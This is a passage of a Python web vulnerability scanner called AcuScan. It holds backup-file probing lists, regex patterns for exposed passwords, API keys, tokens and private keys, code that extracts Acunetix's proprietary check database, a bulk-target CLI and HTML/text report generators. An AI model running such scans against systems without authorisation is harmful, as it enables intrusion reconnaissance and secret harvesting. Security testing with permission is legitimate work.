                "${fileName}${fileExt}.tmp",
                "${fileName}${fileExt}.temp",
                "${fileName}${fileExt}.copy",
                "${fileName}${fileExt}.dist",
                "${fileName}${fileExt}~",
                "${fileName}${fileExt}.1",
                "${fileName}${fileExt}.2",
                "${fileName}_backup${fileExt}",
                "${fileName}_old${fileExt}",
                "${fileName}${fileExt}.bkp",
                "${fileName}${fileExt}.bk",
                "${fileName}${fileExt}.BAK",
                "${fileName}.bak",
                "${fileName}.old",
                "backup_${fileName}${fileExt}",
                "Copy of ${fileName}${fileExt}",
                "${fileName}${fileExt}.orig",
                "${fileName}${fileExt}.save",
            ],
            "text_search": {
                "patterns": [
                    r'password\s*[:=]\s*[\x27\x22]?\w+',
                    r'api[_-]?key\s*[:=]\s*[\x27\x22]?\w+',
                    r'secret[_-]?key\s*[:=]\s*[\x27\x22]?\w+',
                    r'access[_-]?token\s*[:=]\s*[\x27\x22]?\w+',
                    r'aws[_-]?access[_-]?key',
                    r'-----BEGIN.*PRIVATE KEY-----',
                ],
            },
        }


    def _find_security_bin(self):
        """Auto-detect the highest-version security_*.bin file."""
        candidates_dirs = []

        if IS_WINDOWS:
            pd = os.environ.get("ProgramData", r"C:\ProgramData")
            candidates_dirs.extend([
                os.path.join(pd, "Acunetix", "shared", "security"),
                os.path.join(os.environ.get("ProgramFiles", r"C:\Program Files"), "Acunetix", "shared", "security"),
            ])
        else:
            candidates_dirs.extend([
                "/home/acunetix/.acunetix/data/security",
                os.path.expanduser("~/.acunetix/data/security"),
                "/opt/acunetix/shared/security",
            ])

        if ACUNETIX_INSTALL_DIR:
            candidates_dirs.insert(0, os.path.join(ACUNETIX_INSTALL_DIR, "shared", "security"))
            candidates_dirs.insert(0, os.path.join(ACUNETIX_INSTALL_DIR, "data", "security"))

        # Also check current directory and script directory
        candidates_dirs.append(os.getcwd())
        candidates_dirs.append(SCRIPT_DIR)

        best_path = None
        best_ver = 0
        pat = re.compile(r'^security_(\d+)\.bin$', re.IGNORECASE)

        for d in candidates_dirs:
            if not d or not os.path.isdir(d):
                continue
            try:
                for entry in os.listdir(d):
                    m = pat.match(entry)
                    if m:
                        v = int(m.group(1))
                        if v > best_ver:
                            best_ver = v
                            best_path = os.path.join(d, entry)
            except PermissionError:
                continue

        return best_path

            # ── Auto-provision database for scan mode ─────────────────────────────

    def auto_provision(self):
        """
        Automatically provision the vuln database if it doesn't exist.
        Strategy: try -upuz (archive) first, then -upac + -cupz fallback.
        Returns True if DB is available after provisioning.
        """
        db_path = DEFAULT_DB_PATH
        if os.path.isfile(db_path):
            return True  # Already exists

        self._banner("Auto-Provisioning Vulnerability Database")
        self._warn("No vulnerability database found — attempting auto-provision...")

        # Strategy 1: Try to load from archive
        self._info("Strategy 1: Looking for database archive...")
        found_path, found_ver = find_best_archive()
        if found_path:
            self._info(f"Found archive: {os.path.basename(found_path)}")
            ok = self.update_from_archive(found_path)
            if ok and os.path.isfile(db_path):
                self._ok("Database provisioned from archive")
                return True

        # Strategy 2: Extract from local Acunetix + create archive
        self._info("Strategy 2: Extracting from local Acunetix install...")
        ok = self.update_from_acunetix()
        if ok and os.path.isfile(db_path):
            self._ok("Database provisioned from Acunetix")
            # Also create archive for future use
            self._info("Creating archive for future use...")
            self.create_archive()
            return True

        self._err("Auto-provisioning failed!")
        self._info("Options:")
        self._info("  1. python3 scanner.py -upac /path/to/Scripts")
        self._info(f"  2. python3 scanner.py -upuz /path/to/{DEFAULT_ARCHIVE_PREFIX}_VERSION.tgz")
        self._info("  3. python3 scanner.py -upac   (if Acunetix scripts are at default path)")
        return False

    # ── Helper: find Acunetix scripts ─────────────────────────────────────

    def _find_acunetix_scripts(self):
        """Auto-detect Acunetix decoded scripts directory (cross-platform)."""
        # Re-detect in case paths changed
        detected, _ = _detect_acunetix_paths()
        if detected:
            return detected

        # Additional candidates
        candidates = [
            os.path.join(SCRIPT_DIR, "acunetix_scripts", "Scripts"),
            os.path.join(SCRIPT_DIR, "Scripts"),
        ]
        if IS_WINDOWS:
            pd = os.environ.get("ProgramData", r"C:\ProgramData")
            candidates.append(os.path.join(pd, "Acunetix", "shared", "Scripts"))
        else:
            candidates.extend([
                "/home/acunetix/.acunetix/data/Scripts",
                os.path.expanduser("~/.acunetix/data/Scripts"),
                "/opt/acunetix/data/Scripts",
            ])

        for p in candidates:
            if os.path.isdir(p):
                if os.path.isdir(os.path.join(p, "Includes")) or os.path.isdir(os.path.join(p, "PerServer")):
                    return p
        return None


# ═══════════════════════════════════════════════════════════════════════════════
#  CLI Argument Parser
# ═══════════════════════════════════════════════════════════════════════════════

class WideHelpFormatter(argparse.RawDescriptionHelpFormatter):
    """Custom formatter: param + help on same line, wide columns."""

    def __init__(self, prog, indent_increment=2, max_help_position=70, width=150):
        super().__init__(prog, indent_increment=indent_increment,
                         max_help_position=max_help_position, width=width)


def build_parser():
    """Build the argument parser with nuclei-style interface."""
    parser = argparse.ArgumentParser(
        prog="scanner.py",
        description=f"{C.CYN}AcuScan v{VERSION} (c) tg:@Neoleads{C.RST}",
        formatter_class=WideHelpFormatter,
        epilog=f"""
{C.GRY}SCAN:{C.RST}
  python3 scanner.py -u https://target.com
  python3 scanner.py -u https://target1.com -u https://target2.com
  python3 scanner.py -l targets.txt -o results.json -c 50

{C.GRY}DATABASE UPDATE:{C.RST}
  python3 scanner.py -upac                                   Extract from local Acunetix (auto-detect)
  python3 scanner.py -upac /path/to/Scripts                   Extract from specific path
  python3 scanner.py -acuconvupdate security_251107103.bin    Convert Acunetix .bin and create update archive
  python3 scanner.py -cupz                                    Create updatedbd_VERSION.tgz archive
  python3 scanner.py -upuz                                    Update from best archive (auto-find)
  python3 scanner.py -upuz /path/to/updatedbd_VERSION.tgz     Update from specific archive

{C.GRY}EXAMPLES:{C.RST}
  python3 scanner.py -u https://target.com -c 50 -rl 200
  python3 scanner.py -u https://target.com -severity high,critical
  python3 scanner.py -l targets.txt -o results.json -bs 10 -c 30
        """
    )

    # ── TARGET ──
    target_group = parser.add_argument_group(f'{C.CYN}TARGET{C.RST}')
    target_group.add_argument('-u', '-target', '--target', dest='targets', action='append', default=[],
                              metavar='string', help='Target URL(s) to scan')
    target_group.add_argument('-l', '-list', '--list', dest='list_file', metavar='string',
                              help='File containing list of target URLs')

    # ── OUTPUT ──
    output_group = parser.add_argument_group(f'{C.CYN}OUTPUT{C.RST}')
    output_group.add_argument('-o', '-output', '--output', dest='output', metavar='string',
                              help='Output text report file (.txt)')
    output_group.add_argument('-oh', '-output-html', '--output-html', dest='output_html', metavar='string',
                              help='Output HTML report file (.html) with sortable/filterable table')
    output_group.add_argument('-ooh', '-output-both', '--output-both', dest='output_both', metavar='string',
                              help='Output both text (.txt) and HTML (.html) reports')
    output_group.add_argument('-silent', '--silent', action='store_true',
                              help='Show only findings')
    output_group.add_argument('-nc', '-no-color', '--no-color', dest='no_color', action='store_true',
                              help='Disable colored output')
    output_group.add_argument('-v', '-verbose', '--verbose', action='store_true',
                              help='Verbose output')

    # ── CONFIGURATIONS ──
    config_group = parser.add_argument_group(f'{C.CYN}CONFIGURATIONS{C.RST}')
    config_group.add_argument('-fr', '-follow-redirects', '--follow-redirects', dest='follow_redirects',
                              action='store_true', default=True,
                              help='Follow HTTP redirects (default: true)')
    config_group.add_argument('-fhr', '-follow-host-redirects', '--follow-host-redirects',
                              dest='follow_host_redirects', action='store_true',
                              help='Follow redirects on the same host only')
    config_group.add_argument('-mr', '-max-redirects', '--max-redirects', dest='max_redirects',
                              type=int, default=10, metavar='int',
                              help='Max number of redirects (default: 10)')
    config_group.add_argument('-dr', '-disable-redirects', '--disable-redirects', dest='disable_redirects',
                              action='store_true',
                              help='Disable following redirects')
    config_group.add_argument('-severity', '--severity', dest='severity', metavar='string',
                              help='Filter by severity (critical,high,medium,low,info)')
    config_group.add_argument('-db', '--database', dest='db_path', metavar='string',
                              help='Checks database path (default: data/checks_db.json)')
    config_group.add_argument('-ua', '-user-agent', '--user-agent', dest='user_agent', metavar='string',
                              default=DEFAULT_UA,
                              help='Custom User-Agent string')
    config_group.add_argument('-crawl-depth', '--crawl-depth', dest='crawl_depth', type=int, default=3,
                              metavar='int', help='Maximum crawl depth (default: 3)')
    config_group.add_argument('-crawl-max', '--crawl-max', dest='crawl_max_pages', type=int, default=200,
                              metavar='int', help='Maximum pages to crawl (default: 200)')
    config_group.add_argument('-timeout', '--timeout', dest='timeout', type=int, default=10,
                              metavar='int', help='HTTP request timeout in seconds (default: 10)')
    config_group.add_argument('-proxy', '--proxy', dest='proxy', metavar='URL',
                              help='Proxy URL (http://host:port, https://host:port, socks4://host:port, socks5://host:port)')

    # ── RATE-LIMIT ──
    rate_group = parser.add_argument_group(f'{C.CYN}RATE-LIMIT{C.RST}')
    rate_group.add_argument('-rl', '-rate-limit', '--rate-limit', dest='rate_limit',
                            type=int, default=1000, metavar='int',
                            help='Global max requests per second (default: 1000)')
    rate_group.add_argument('-trl', '-target-rate-limit', '--target-rate-limit', dest='target_rate_limit',
                            type=int, default=150, metavar='int',
                            help='Max requests per second per target (default: 150)')
    rate_group.add_argument('-bs', '-bulk-size', '--bulk-size', dest='bulk_size',
                            type=int, default=25, metavar='int',
                            help='Number of targets to scan in parallel (default: 25)')
    rate_group.add_argument('-c', '-concurrency', '--concurrency', dest='concurrency',
                            type=int, default=25, metavar='int',
                            help='Number of concurrent checks per target (default: 25)')

    # ── DATABASE UPDATE ──
    update_group = parser.add_argument_group(f'{C.CYN}DATABASE UPDATE{C.RST}')
    update_group.add_argument('-upac', '--update-from-acunetix', dest='upac', nargs='?',
                              const='__auto__', default=None, metavar='path',
                              help='Update DB from local Acunetix scripts (auto-detect or path)')
    update_group.add_argument('-acuconvupdate', '--acunetix-conv-db-to-update', dest='acuconvupdate',
                              nargs='?', const='__auto__', default=None, metavar='BIN',
                              help='Convert Acunetix security .bin to scanner update archive')
    update_group.add_argument('-cupz', '--create-archive', dest='cupz', nargs='?',
                              const='__auto__', default=None, metavar='path',
                              help='Create portable database archive (updatedbd_VERSION.tgz)')
    update_group.add_argument('-upuz', '--update-from-archive', dest='upuz', nargs='?',
                              const='__auto__', default=None, metavar='path',
                              help='Update DB from archive (updatedbd_VERSION.tgz)')

    return parser


# ═══════════════════════════════════════════════════════════════════════════════
#  Main Entry Point
# ═══════════════════════════════════════════════════════════════════════════════


# ═══════════════════════════════════════════════════════════════════════════════
#  Report Generators
# ═══════════════════════════════════════════════════════════════════════════════

SEVERITY_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}


def _write_text_report(filepath, targets, findings):
    """Write a detailed text report of all findings."""
    sev_counts = defaultdict(int)
    for f in findings:
        sev_counts[f.severity] += 1

    sorted_findings = sorted(findings, key=lambda f: (SEVERITY_ORDER.get(f.severity, 9), f.name, f.url))

    lines = []
    w = lines.append
    w("=" * 90)
    w("  AcuScan v%s - Scan Report  (c) tg:@Neoleads" % VERSION)
    w("=" * 90)
    w("")
    w("  Date:    %s" % datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
    w("  Targets: %d" % len(targets))
    for t in targets:
        w("           %s" % t)
    w("")
    w("  Total Findings: %d" % len(findings))
    for sev in ["critical", "high", "medium", "low", "info"]:
        cnt = sev_counts.get(sev, 0)
        if cnt:
            w("    %10s: %d" % (sev.upper(), cnt))
    w("")
    w("-" * 90)

    for i, f in enumerate(sorted_findings, 1):
        w("")
        w("  [%04d] %s - %s" % (i, f.severity.upper(), f.name))
        sep = "  " + chr(0x2500) * 70
        w(sep)
        w("  URL:       %s" % f.url)
        if f.category:
            w("  Category:  %s" % f.category)
        if f.check_name:
            w("  Check:     %s" % f.check_name)
        if f.detail:
            w("  Detail:    %s" % f.detail)
        if f.evidence:
            w("  Evidence:  %s" % f.evidence)
        if f.cve:
            w("  CVE:       %s" % f.cve)
        if f.cwe:
            w("  CWE:       %s" % f.cwe)
        if f.cvss:
            w("  CVSS:      %s" % f.cvss)
        if f.vuln_ref:
            w("  Reference: %s" % f.vuln_ref)
        if f.tags:
            w("  Tags:      %s" % f.tags)
        w("  Time:      %s" % f.timestamp)
        w("")

    w("-" * 90)
    w("  End of report. %d findings." % len(findings))
    w("=" * 90)

    with open(filepath, 'w', encoding='utf-8') as fh:
        fh.write('\n'.join(lines))


def _html_escape(s):
    """Escape HTML special characters."""
    if not s:
        return ""
    return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;").replace("'", "&#39;")


def _write_html_report(filepath, targets, findings):
    """Write a detailed interactive HTML report with sortable/filterable table."""
    sev_counts = defaultdict(int)
    for f in findings:
        sev_counts[f.severity] += 1

    sorted_findings = sorted(findings, key=lambda f: (SEVERITY_ORDER.get(f.severity, 9), f.name, f.url))
    scan_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    rows_js = []
    for f in sorted_findings:
        rows_js.append({
            "id": f.id, "name": _html_escape(f.name), "severity": f.severity,
            "url": _html_escape(f.url), "detail": _html_escape(f.detail),
            "evidence": _html_escape(f.evidence), "cve": _html_escape(f.cve),
            "cwe": _html_escape(f.cwe), "cvss": _html_escape(str(f.cvss)),
            "category": _html_escape(f.category), "check_name": _html_escape(f.check_name),
            "vuln_ref": _html_escape(f.vuln_ref), "tags": _html_escape(f.tags),
            "timestamp": f.timestamp,
        })

    rows_json = json.dumps(rows_js, ensure_ascii=False)
    targets_html = ', '.join(_html_escape(t) for t in targets)
    total = len(findings)
    crit_n = sev_counts.get("critical", 0)
    high_n = sev_counts.get("high", 0)
    med_n = sev_counts.get("medium", 0)
    low_n = sev_counts.get("low", 0)
    info_n = sev_counts.get("info", 0)

    html = _build_html_template(scan_time, targets_html, total, crit_n, high_n, med_n, low_n, info_n, rows_json)

    with open(filepath, 'w', encoding='utf-8') as fh:
        fh.write(html)


def _build_html_template(scan_time, targets_html, total, crit_n, high_n, med_n, low_n, info_n, rows_json):
    """Build the complete HTML report string (avoids f-string escaping issues with CSS/JS braces)."""
    return """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AcuScan Report - """ + scan_time + """</title>
<style>
:root {
    --bg: #0f172a; --bg2: #1e293b; --bg3: #334155; --fg: #e2e8f0;
    --fg2: #94a3b8; --accent: #38bdf8; --border: #475569;
    --crit: #dc2626; --high: #ea580c; --med: #d97706; --low: #2563eb; --info: #6b7280;
}
* { margin:0; padding:0; box-sizing:border-box; }
body { background:var(--bg); color:var(--fg); font-family:'Segoe UI',system-ui,-apple-system,sans-serif; font-size:14px; }
.container { max-width:1600px; margin:0 auto; padding:20px; }
header { background:linear-gradient(135deg, #0f172a 0%, #1e3a5f 100%); border:1px solid var(--border);
         border-radius:12px; padding:30px; margin-bottom:20px; }
header h1 { font-size:28px; color:var(--accent); margin-bottom:8px; }
header .meta { color:var(--fg2); font-size:13px; line-height:1.8; }
header .meta b { color:var(--fg); }
.stats { display:flex; gap:12px; margin-bottom:20px; flex-wrap:wrap; }
.stat { background:var(--bg2); border:1px solid var(--border); border-radius:10px; padding:16px 24px;
        text-align:center; min-width:120px; flex:1; }
.stat .num { font-size:32px; font-weight:700; }
.stat .label { font-size:12px; color:var(--fg2); text-transform:uppercase; margin-top:4px; letter-spacing:1px; }
.stat.total .num { color:var(--accent); }
.stat.critical .num { color:var(--crit); }
.stat.high .num { color:var(--high); }
.stat.medium .num { color:var(--med); }
.stat.low .num { color:var(--low); }
.stat.info .num { color:var(--info); }
.controls { background:var(--bg2); border:1px solid var(--border); border-radius:10px;
            padding:16px; margin-bottom:20px; display:flex; gap:12px; flex-wrap:wrap; align-items:center; }
.controls label { color:var(--fg2); font-size:12px; text-transform:uppercase; letter-spacing:0.5px; }
.controls input, .controls select { background:var(--bg); border:1px solid var(--border); color:var(--fg);
    border-radius:6px; padding:8px 12px; font-size:13px; outline:none; }
.controls input:focus, .controls select:focus { border-color:var(--accent); }
.controls input[type=text] { width:280px; }
.filter-group { display:flex; flex-direction:column; gap:4px; }
.sev-filters { display:flex; gap:6px; }
.sev-btn { padding:5px 14px; border-radius:16px; border:2px solid; cursor:pointer; font-size:12px;
           font-weight:600; text-transform:uppercase; background:transparent; transition:all .15s; }
.sev-btn.active { color:#fff !important; }
.sev-btn.critical { color:var(--crit); border-color:var(--crit); }
.sev-btn.critical.active { background:var(--crit); }
.sev-btn.high { color:var(--high); border-color:var(--high); }
.sev-btn.high.active { background:var(--high); }
.sev-btn.medium { color:var(--med); border-color:var(--med); }
.sev-btn.medium.active { background:var(--med); }
.sev-btn.low { color:var(--low); border-color:var(--low); }
.sev-btn.low.active { background:var(--low); }
.sev-btn.info { color:var(--info); border-color:var(--info); }
.sev-btn.info.active { background:var(--info); }
table { width:100%; border-collapse:collapse; background:var(--bg2); border-radius:10px; overflow:hidden;
        border:1px solid var(--border); }
thead { background:var(--bg3); }
th { padding:12px 10px; text-align:left; font-size:12px; text-transform:uppercase; letter-spacing:0.5px;
    color:var(--fg2); cursor:pointer; user-select:none; white-space:nowrap; position:relative; }
th:hover { color:var(--accent); }
th .sort-arrow { font-size:10px; margin-left:4px; opacity:0.4; }
th.sorted .sort-arrow { opacity:1; color:var(--accent); }
td { padding:10px; border-top:1px solid var(--border); font-size:13px; vertical-align:top; max-width:400px;
    word-break:break-word; }
tr:hover td { background:rgba(56,189,248,0.05); }
.sev-badge { display:inline-block; padding:3px 10px; border-radius:12px; font-size:11px; font-weight:700;
             text-transform:uppercase; color:#fff; min-width:70px; text-align:center; }
.sev-critical { background:var(--crit); }
.sev-high { background:var(--high); }
.sev-medium { background:var(--med); }
.sev-low { background:var(--low); }
.sev-info { background:var(--info); }
.url-cell { font-family:'Cascadia Code','Fira Code',monospace; font-size:12px; color:var(--accent);
            word-break:break-all; }
.detail-cell { max-width:320px; overflow:hidden; text-overflow:ellipsis; }
.evidence-cell { font-family:monospace; font-size:12px; color:#facc15; max-width:250px;
                 overflow:hidden; text-overflow:ellipsis; }
.no-results { text-align:center; padding:40px; color:var(--fg2); font-size:16px; }
footer { text-align:center; color:var(--fg2); font-size:12px; margin-top:20px; padding:16px; }
.expand-btn { background:none; border:1px solid var(--border); color:var(--accent); cursor:pointer;
              border-radius:4px; padding:2px 6px; font-size:11px; margin-left:4px; }
.expand-btn:hover { background:var(--bg3); }
.row-detail { display:none; background:var(--bg); }
.row-detail td { padding:16px 20px; font-size:13px; line-height:1.8; }
.row-detail .field { display:flex; gap:12px; margin-bottom:4px; }
.row-detail .field-label { color:var(--fg2); min-width:100px; font-weight:600; }
.row-detail .field-value { color:var(--fg); font-family:monospace; word-break:break-all; }
.count-badge { background:var(--bg3); color:var(--fg2); padding:2px 8px; border-radius:8px;
               font-size:11px; margin-left:8px; }
@media (max-width:1200px) {
    .container { padding:10px; }
    .controls { flex-direction:column; }
    td, th { padding:6px; font-size:12px; }
}
</style>
</head>
<body>
<div class="container">

<header>
    <h1>&#128270; AcuScan Report</h1>
    <div class="meta">
        <b>Scanner:</b> AcuScan v""" + VERSION + """ &nbsp;|&nbsp;
        <b>Date:</b> """ + scan_time + """ &nbsp;|&nbsp;
        <b>Targets:</b> """ + targets_html + """ &nbsp;|&nbsp;
        <b>Findings:</b> """ + str(total) + """
    </div>
</header>

<div class="stats">
    <div class="stat total"><div class="num">""" + str(total) + """</div><div class="label">Total</div></div>
    <div class="stat critical"><div class="num">""" + str(crit_n) + """</div><div class="label">Critical</div></div>
    <div class="stat high"><div class="num">""" + str(high_n) + """</div><div class="label">High</div></div>
    <div class="stat medium"><div class="num">""" + str(med_n) + """</div><div class="label">Medium</div></div>
    <div class="stat low"><div class="num">""" + str(low_n) + """</div><div class="label">Low</div></div>
    <div class="stat info"><div class="num">""" + str(info_n) + """</div><div class="label">Info</div></div>
</div>

<div class="controls">
    <div class="filter-group">
        <label>Search</label>
        <input type="text" id="searchBox" placeholder="Filter by name, URL, detail, CVE..." oninput="applyFilters()">
    </div>
    <div class="filter-group">
        <label>Severity</label>
        <div class="sev-filters">
            <button class="sev-btn critical active" onclick="toggleSev(this,'critical')">Critical</button>
            <button class="sev-btn high active" onclick="toggleSev(this,'high')">High</button>
            <button class="sev-btn medium active" onclick="toggleSev(this,'medium')">Medium</button>
            <button class="sev-btn low active" onclick="toggleSev(this,'low')">Low</button>
            <button class="sev-btn info active" onclick="toggleSev(this,'info')">Info</button>
        </div>
    </div>
    <div class="filter-group">
        <label>Category</label>
        <select id="catFilter" onchange="applyFilters()"><option value="">All</option></select>
    </div>
    <div class="filter-group">
        <label style="color:transparent">.</label>
        <span id="resultCount" class="count-badge"></span>
    </div>
</div>

<table id="findingsTable">
<thead>
<tr>
    <th onclick="sortTable(0)">#<span class="sort-arrow">&#9650;</span></th>
    <th onclick="sortTable(1)">Severity<span class="sort-arrow">&#9650;</span></th>
    <th onclick="sortTable(2)">Name<span class="sort-arrow">&#9650;</span></th>
    <th onclick="sortTable(3)">URL<span class="sort-arrow">&#9650;</span></th>
    <th onclick="sortTable(4)">Detail<span class="sort-arrow">&#9650;</span></th>
    <th onclick="sortTable(5)">CVE<span class="sort-arrow">&#9650;</span></th>
    <th onclick="sortTable(6)">CVSS<span class="sort-arrow">&#9650;</span></th>
    <th onclick="sortTable(7)">Category<span class="sort-arrow">&#9650;</span></th>
    <th>&#8862;</th>
</tr>
</thead>
<tbody id="tableBody">
</tbody>
</table>

<div id="noResults" class="no-results" style="display:none">No findings match the current filters.</div>

<footer>
    Generated by AcuScan v""" + VERSION + """ &mdash; """ + scan_time + """
</footer>
</div>

<script>
const DATA = """ + rows_json + """;
const SEV_ORDER = {"critical":0,"high":1,"medium":2,"low":3,"info":4};
let activeSev = new Set(["critical","high","medium","low","info"]);
let sortCol = 1, sortAsc = true;

(function() {
    const cats = new Set();
    DATA.forEach(r => { if(r.category) cats.add(r.category); });
    const sel = document.getElementById('catFilter');
    [...cats].sort().forEach(c => {
        const o = document.createElement('option');
        o.value = c; o.textContent = c;
        sel.appendChild(o);
    });
})();

function toggleSev(btn, sev) {
    btn.classList.toggle('active');
    if(activeSev.has(sev)) activeSev.delete(sev);
    else activeSev.add(sev);
    applyFilters();
}

function applyFilters() {
    const q = document.getElementById('searchBox').value.toLowerCase();
    const cat = document.getElementById('catFilter').value;
    const filtered = DATA.filter(r => {
        if(!activeSev.has(r.severity)) return false;
        if(cat && r.category !== cat) return false;
        if(q) {
            const hay = (r.name + ' ' + r.url + ' ' + r.detail + ' ' + r.cve + ' ' + r.cwe + ' ' +
                         r.evidence + ' ' + r.tags + ' ' + r.check_name + ' ' + r.vuln_ref).toLowerCase();
            if(!hay.includes(q)) return false;
        }
        return true;
    });
    renderTable(filtered);
}

function sortTable(col) {
    const ths = document.querySelectorAll('#findingsTable th');
    ths.forEach(t => t.classList.remove('sorted'));
    if(sortCol === col) sortAsc = !sortAsc;
    else { sortCol = col; sortAsc = true; }
    ths[col].classList.add('sorted');
    ths[col].querySelector('.sort-arrow').innerHTML = sortAsc ? '&#9650;' : '&#9660;';
    applyFilters();
}

function getSortVal(r, col) {
    switch(col) {
        case 0: return r.id;
        case 1: return SEV_ORDER[r.severity] || 9;
        case 2: return r.name.toLowerCase();
        case 3: return r.url.toLowerCase();
        case 4: return r.detail.toLowerCase();
        case 5: return r.cve.toLowerCase();
        case 6: return parseFloat(r.cvss) || 0;
        case 7: return r.category.toLowerCase();
        default: return '';
    }
}

function renderTable(rows) {
    rows.sort((a, b) => {
        let va = getSortVal(a, sortCol), vb = getSortVal(b, sortCol);
        if(typeof va === 'number') return sortAsc ? va - vb : vb - va;
        return sortAsc ? String(va).localeCompare(String(vb)) : String(vb).localeCompare(String(va));
    });
    const tbody = document.getElementById('tableBody');
    const nr = document.getElementById('noResults');
    document.getElementById('resultCount').textContent = rows.length + ' of ' + DATA.length + ' shown';
    if(!rows.length) { tbody.innerHTML = ''; nr.style.display = 'block'; return; }
    nr.style.display = 'none';
    const frags = [];
    rows.forEach((r, i) => {
        const sevCls = 'sev-' + r.severity;
        frags.push('<tr id="row-' + r.id + '">');
        frags.push('<td>' + (i+1) + '</td>');
        frags.push('<td><span class="sev-badge ' + sevCls + '">' + r.severity + '</span></td>');
        frags.push('<td>' + r.name + '</td>');
        frags.push('<td class="url-cell">' + r.url + '</td>');
        frags.push('<td class="detail-cell">' + (r.detail || '-') + '</td>');
        frags.push('<td>' + (r.cve || '-') + '</td>');
        frags.push('<td>' + (r.cvss || '-') + '</td>');
        frags.push('<td>' + (r.category || '-') + '</td>');
        frags.push('<td><button class="expand-btn" onclick="toggleDetail(' + r.id + ',this)">+</button></td>');
        frags.push('</tr>');
        frags.push('<tr class="row-detail" id="detail-' + r.id + '"><td colspan="9"><div>');
        const fields = [
            ['Name', r.name], ['Severity', r.severity], ['URL', r.url],
            ['Category', r.category], ['Check', r.check_name], ['Detail', r.detail],
            ['Evidence', r.evidence], ['CVE', r.cve], ['CWE', r.cwe],
            ['CVSS', r.cvss], ['Reference', r.vuln_ref], ['Tags', r.tags],
            ['Timestamp', r.timestamp]
        ];
        fields.forEach(f => {
            if(f[1]) frags.push('<div class="field"><span class="field-label">' + f[0] +
                               ':</span><span class="field-value">' + f[1] + '</span></div>');
        });
        frags.push('</div></td></tr>');
    });
    tbody.innerHTML = frags.join('');
}

function toggleDetail(id, btn) {
    const row = document.getElementById('detail-' + id);
    if(row.style.display === 'table-row') {
        row.style.display = 'none';
        btn.textContent = '+';
    } else {
        row.style.display = 'table-row';
        btn.textContent = '-';
    }
}

applyFilters();
</script>
</body>
</html>"""


def main():
    parser = build_parser()
    args = parser.parse_args()

    no_color = args.no_color

    # ── Handle database update operations ─────────────────────────────────
    # These are standalone operations that don't require a scan target

    if args.upac is not None:
        updater = DatabaseUpdater(no_color=no_color)
        scripts_dir = None if args.upac == '__auto__' else args.upac
        success = updater.update_from_acunetix(scripts_dir)
        sys.exit(0 if success else 1)

    if args.acuconvupdate is not None:
        updater = DatabaseUpdater(no_color=no_color)
        bin_path = None if args.acuconvupdate == '__auto__' else args.acuconvupdate
        success = updater.convert_acunetix_bin(bin_path)
        sys.exit(0 if success else 1)

    if args.cupz is not None:
        updater = DatabaseUpdater(no_color=no_color)
        archive_path = None if args.cupz == '__auto__' else args.cupz
        success = updater.create_archive(archive_path)
        sys.exit(0 if success else 1)

    if args.upuz is not None:
        updater = DatabaseUpdater(no_color=no_color)
        archive_path = None if args.upuz == '__auto__' else args.upuz
        success = updater.update_from_archive(archive_path)
        sys.exit(0 if success else 1)

    # ── Normal scan mode ──────────────────────────────────────────────────

    # Auto-provision database if missing
    updater = DatabaseUpdater(no_color=no_color)
    if not updater.auto_provision():
        sys.exit(1)

    # Build config
    config = {
        "follow_redirects": args.follow_redirects and not args.disable_redirects,
        "follow_host_redirects": args.follow_host_redirects,
        "max_redirects": args.max_redirects,
        "disable_redirects": args.disable_redirects,
        "rate_limit": args.target_rate_limit,
        "concurrency": args.concurrency,
        "no_color": no_color,
        "silent": args.silent,
        "verbose": args.verbose,
        "user_agent": args.user_agent,
        "crawl_depth": args.crawl_depth,
        "crawl_max_pages": args.crawl_max_pages,
        "timeout": args.timeout,
        "db_path": args.db_path,
        "proxy": args.proxy,
    }

    # Severity filter
    if args.severity:
        config["severity_filter"] = [s.strip().lower() for s in args.severity.split(',')]

    out = OutputFormatter(no_color=no_color, silent=args.silent)
    out.banner()

    # Collect targets
    targets = list(args.targets)
    if args.list_file:
        try:
            with open(args.list_file, encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        targets.append(line)
        except FileNotFoundError:
            out.error(f"Target list file not found: {args.list_file}")
            sys.exit(1)

    if not targets:
        parser.print_help()
        print(f"\n  {C.RED}Error: No targets specified. Use -u or -l{C.RST}")
        print(f"  {C.GRY}For database operations, use -upac, -cupz, or -upuz{C.RST}\n")
        sys.exit(1)

    # Deduplicate targets
    targets = list(OrderedDict.fromkeys(targets))
    out.info(f"Targets: {len(targets)}")

    # Show DB version info
    db_ver = get_db_version()
    if db_ver:
        out.info(f"Database version: {db_ver}")

    # Run scans
    all_findings = []

    if len(targets) == 1:
        # Single target
        scanner = Scanner(config)
        scanner.load_database()
        findings = scanner.scan(targets[0])
        all_findings.extend(findings)
    else:
        # Multi-target with bulk-size control
        scanner = Scanner(config)
        scanner.load_database()

        for i in range(0, len(targets), args.bulk_size):
            batch = targets[i:i + args.bulk_size]
            out.info(f"Batch {i // args.bulk_size + 1}: {len(batch)} targets")

            for target in batch:
                out.info(f"\n{'='*60}")
                out.info(f"Scanning: {target}")
                out.info(f"{'='*60}")

                # Reset per-target state
                scanner.findings = []
                scanner.crawled_urls = set()
                scanner.crawled_forms = []
                scanner.crawled_params = defaultdict(set)
                scanner.tech_stack = {}
                scanner.stop_event = threading.Event()
                scanner._404_body_cache = {}
                Finding._counter = 0

                findings = scanner.scan(target)
                all_findings.extend(findings)

    # ═══ Write reports ═══
    text_path = None
    html_path = None

    if args.output_both:
        base = args.output_both
        if base.lower().endswith('.txt'):
            base = base[:-4]
        elif base.lower().endswith('.html'):
            base = base[:-5]
        text_path = base + '.txt'
        html_path = base + '.html'
    elif args.output:
        text_path = args.output
        if not text_path.lower().endswith('.txt'):
            text_path = text_path + '.txt'
    elif args.output_html:
        html_path = args.output_html
        if not html_path.lower().endswith('.html'):
            html_path = html_path + '.html'

    # Write text report
    if text_path:
        _write_text_report(text_path, targets, all_findings)
        out.info(f"Text report: {text_path}")

    # Write HTML report
    if html_path:
        _write_html_report(html_path, targets, all_findings)
        out.info(f"HTML report: {html_path}")

    out.info(f"Total findings: {len(all_findings)}")


if __name__ == "__main__":
    main()
